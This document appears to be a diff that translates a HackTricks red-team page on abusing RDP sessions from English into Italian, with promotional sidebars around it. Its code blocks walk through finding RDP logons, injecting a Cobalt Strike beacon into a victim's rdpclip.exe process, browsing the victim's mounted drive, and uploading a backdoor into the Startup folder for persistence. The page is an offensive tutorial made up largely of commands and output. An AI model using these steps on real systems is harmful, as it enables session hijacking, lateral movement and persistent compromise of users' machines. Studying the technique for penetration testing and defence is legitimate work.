@@ -1,25 +1,24 @@
-# RDP Sessions Abuse
+# Abuso delle sessioni RDP
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Altri modi per supportare HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Condividi i tuoi trucchi di hacking inviando PR ai repository** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) su GitHub.
 
 </details>
 
-## RDP Process Injection
+## Iniezione di processo RDP
 
-If the **external group** has **RDP access** to any **computer** in the current domain, an **attacker** could **compromise that computer and wait for him**.
+Se il **gruppo esterno** ha accesso **RDP** a qualsiasi **computer** nel dominio corrente, un **attaccante** potrebbe **compromettere quel computer e aspettare**.
 
-Once that user has accessed via RDP, the **attacker can pivot to that users session** and abuse its permissions in the external domain.
-
+Una volta che l'utente ha accesso tramite RDP, l'**attaccante può passare alla sessione di quell'utente** e abusare dei suoi permessi nel dominio esterno.
 ```powershell
 # Supposing the group "External Users" has RDP access in the current domain
 ## lets find where they could access
@@ -35,23 +34,21 @@ EXT\super.admin
 
 # With cobalt strike you could just inject a beacon inside of the RDP process
 beacon> ps
- PID   PPID  Name                         Arch  Session     User
- ---   ----  ----                         ----  -------     -----
- ...
- 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin
+PID   PPID  Name                         Arch  Session     User
+---   ----  ----                         ----  -------     -----
+...
+4960  1012  rdpclip.exe                  x64   3           EXT\super.admin
 
 beacon> inject 4960 x64 tcp-local
 ## From that beacon you can just run powerview modules interacting with the external domain as that user
 ```
-
-Check **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
+Controlla **altre modalità per rubare sessioni con altri strumenti** [**in questa pagina.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
 
 ## RDPInception
 
-If a user access via **RDP into a machine** where an **attacker** is **waiting** for him, the attacker will be able to **inject a beacon in the RDP session of the user** and if the **victim mounted his drive** when accessing via RDP, the **attacker could access it**.
+Se un utente accede tramite **RDP a una macchina** in cui un **attaccante** lo sta **aspettando**, l'attaccante sarà in grado di **iniettare un beacon nella sessione RDP dell'utente** e se la **vittima ha montato il suo drive** durante l'accesso tramite RDP, l'attaccante potrebbe accedervi.
 
-In this case you could just **compromise** the **victims** **original computer** by writing a **backdoor** in the **statup folder**.
-
+In questo caso potresti semplicemente **compromettere** il **computer originale della vittima** scrivendo un **backdoor nella cartella di avvio**.
 ```powershell
 # Wait til someone logs in:
 net logons
@@ -60,10 +57,10 @@ EXT\super.admin
 
 # With cobalt strike you could just inject a beacon inside of the RDP process
 beacon> ps
- PID   PPID  Name                         Arch  Session     User
- ---   ----  ----                         ----  -------     -----
- ...
- 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin
+PID   PPID  Name                         Arch  Session     User
+---   ----  ----                         ----  -------     -----
+...
+4960  1012  rdpclip.exe                  x64   3           EXT\super.admin
 
 beacon> inject 4960 x64 tcp-local
 
@@ -71,29 +68,28 @@ beacon> inject 4960 x64 tcp-local
 ## \\tsclient\c is the C: drive on the origin machine of the RDP session
 beacon> ls \\tsclient\c
 
- Size     Type    Last Modified         Name
- ----     ----    -------------         ----
-          dir     02/10/2021 04:11:30   $Recycle.Bin
-          dir     02/10/2021 03:23:44   Boot
-          dir     02/20/2021 10:15:23   Config.Msi
-          dir     10/18/2016 01:59:39   Documents and Settings
-          [...]
+Size     Type    Last Modified         Name
+----     ----    -------------         ----
+dir     02/10/2021 04:11:30   $Recycle.Bin
+dir     02/10/2021 03:23:44   Boot
+dir     02/20/2021 10:15:23   Config.Msi
+dir     10/18/2016 01:59:39   Documents and Settings
+[...]
 
 # Upload backdoor to startup folder
 beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 beacon> upload C:\Payloads\pivot.exe
 ```
-
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Altri modi per supportare HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
